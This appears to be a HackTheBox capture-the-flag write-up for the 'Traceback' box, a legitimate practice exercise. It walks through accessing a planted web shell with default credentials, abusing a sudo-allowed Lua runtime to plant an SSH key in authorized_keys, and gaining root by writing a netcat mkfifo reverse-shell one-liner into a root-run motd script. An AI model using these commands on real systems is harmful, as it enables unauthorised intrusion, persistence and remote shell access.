# Traceback (HackTheBox)
###### August 19, 2020
Started the box by enumerating services on the machine using nmap. Nmap scan returned http and ssh services which weren't that interesting.

<div className={styles.codeblock}>

```

Going to http://10.10.10.181, the website had already been owned by Xh4H and the hacker claims to have left a backdoor somewhere.

Running directory bruteforcing using Daniel Miessler's wordlists returned zero results. However, upon checking the page source, there's a comment saying "Some of the best web shells that you might need". 
Throwing that string into Google took me to a Github repo https://github.com/TheBinitGhimire/Web-Shells.

Going through the list of backdoors, http://10.10.10.181/smevk.php returned a <code>HTTP 200 OK</code>. Using the default credentials <code>admin:admin</code>, I was able to gain access to the webshell.
The webshell's interface was really ugly, but it was sufficient to do some basic enumeration.

<div className={styles.codeblock}>

```
# Determine user
$ whoami
webadmin

# Check home directory
$ ls -a /home/webadmin
. .. .bash_history .bash_logout .bashrc .cache .local .luvit_history .profile .ssh note.txt

# Read note.txt
$ cat /home/webadmin/note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.

# List user privileges
$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

</div>

Looking through the results, it seems <code>/home/sysadmin/luvit</code> can be executed as the user <code>sysadmin</code> without authentication.

I had never written a single line of Lua code before and after doing some googling it seems that Luvit is a runtime environment for Lua.
Reading through the documentation I tried to craft some lua payload which will be executed as <code>sysadmin</code>.

The following lua code lists files in <code>/home/sysadmin</code>

<div className={styles.codeblock}>

```
directory='/home/sysadmin/'
pfile = io.popen('ls -a "'..directory..'"')
for filename in pfile:lines() do
    print(filename)
end
```

</div>

To execute this piece of code, I simply had to write this code somewhere on the box and run it using luvit. To do so, I echoed my code to <code>/tmp/</code> on the box and ran it.

<div className={styles.codeblock}>

```
$ echo "directory='/home/sysadmin/';pfile = io.popen('ls -a \\"'..directory..'\\"');for filename in pfile:lines() do;print(filename);end" > /tmp/listdir.lua

$ sudo -u sysadmin /home/sysadmin/luvit /tmp/listdir.lua
. .. .bash_history .bash_logout .bashrc .cache .local .profile .ssh luvit user.txt

```

</div>

Modifying the payload to print <code>/home/sysadmin/user.txt</code>, I got my first flag.

<div className={styles.codeblock}>

```
$ echo "pfile = io.popen('cat /home/sysadmin/user.txt');for filename in pfile:lines() do;print(filename);end" > /tmp/getflag.lua

$ sudo -u sysadmin /home/sysadmin/luvit /tmp/getflag.lua
{{FLAG}}

```

</div>

Enumerating through sysadmin's home folder, I found the <code>.ssh</code> folder with the <code>authorized_keys</code> file. Adding my public key to this file should grant me ssh access as sysadmin to the box.
Using <code>ssh-keygen</code>, I created a new ssh keypair. The payload adds my public key to the list of authorized keys. 

<div className={styles.codeblock}>

```
$ echo "io.popen(\\"echo '{{PUBLIC KEY}}' >> /home/sysadmin/.ssh/authorized_keys\\")" > /tmp/ssh.lua

$ sudo -u sysadmin /home/sysadmin/luvit /tmp/ssh.lua
```

</div>

Ssh-ed into the box using <code>ssh -i PRIVATE_KEY sysadmin@10.10.10.181</code> and I was greeted by a message from Xh4h and a shell.

<div className={styles.codeblock}>

```
âžœ  ~ ssh -i PRIVATE_KEY sysadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

$
```

</div>

Trying to privilege escalate from sysadmin to root was kinda tricky. I tried looking for files with incorrect permisions or suid binaries but found nothing. However looking through the list of processes using <code>ps -aux</code>, there was a command being executed as root that seemed to be running at intervals.

<div className={styles.codeblock}>

```
root       3851  0.0  0.0   4628   772 ?        Ss   19:15   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```

</div>

The command seems to be restoring a backup of the message of the day (motd), which is a service that can be used to print custom greeting messages upon login - similar to the greeting from Xh4h upon ssh-ing into the box.

Looking through <code>/etc/update-motd.d/</code>, there were several messages and the first one <code>/etc/update-motd.d/00-header</code> contained <code>echo "\nWelcome to Xh4H land \n"</code>, which was the greeting upon logging into the box. This could be abused by adding commands to run upon login, which will be run as root.

I set up a reverse shell listener on port 1337 on my local machine. Afterwards, I edited <code>/etc/update-motd.d/00-header</code> to set up a netcat reverse shell connector. 

<div className={styles.codeblock}>

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ipaddr}} 1337 >/tmp/f; echo "\nWelcome to Xh4Hland \n"
```

</div>

In a different window, ssh into the box and monitor the reverse shell listener. Note that it may require a few tries since the motd gets overwritten every 30 seconds. If timed correctly you should have access to the root shell. Navigate to <code>/root</code> to grab the root flag.

<div className={styles.codeblock}>

```
$ cat /root/root.txt
{{FLAG}}

```

</div>
